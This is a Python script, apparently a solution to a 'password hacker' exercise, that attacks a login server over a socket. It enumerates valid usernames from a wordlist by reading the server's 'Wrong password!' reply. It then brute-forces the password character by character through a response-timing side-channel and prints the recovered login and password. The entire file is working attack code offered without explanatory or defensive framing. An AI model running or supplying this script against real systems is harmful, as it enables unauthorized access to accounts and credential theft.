import sys
import socket
import json
import string
import time

alphnum = string.ascii_lowercase + string.ascii_uppercase + string.digits


class PasswordHack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self._sock = socket.socket()
        self.correct_password = ""
        self.correct_login = ""
        self.credentials = ""

    def find_password(self):
        self._sock.connect((self.ip, int(self.port)))
        self.get_corr_login()
        self.get_corr_password()
        self.credentials = {"login": self.correct_login, "password": self.correct_password}
        print(json.dumps(self.credentials))

    def get_corr_login(self):
        with open(f'logins.txt') as f:
            logins = [x.strip() for x in f.readlines()]

        while True:
            for login in logins:
                host_response = self.test_credentials(login, " ")
                if host_response['result'] == "Wrong password!":
                    self.correct_login = login
                    return

    def get_corr_password(self):
        tmp_password = ''

        while True:
            tmp_time = 0
            tmp_char = ''
            for char in alphnum:
                start = time.perf_counter()
                host_response = self.test_credentials(self.correct_login, tmp_password + char)
                end = time.perf_counter()
                response_duration = end - start
                if host_response['result'] == "Connection success!":
                    self.correct_password = tmp_password + char
                    return
                elif response_duration > tmp_time:
                    tmp_time = response_duration
                    tmp_char = char
            tmp_password += tmp_char

    def test_credentials(self, login, password):
        credentials = {"login": login, "password": password}
        self._sock.send(json.dumps(credentials).encode())
        response = self._sock.recv(1024)
        return json.loads(response.decode())


ph = PasswordHack(*sys.argv[1:])
ph.find_password()
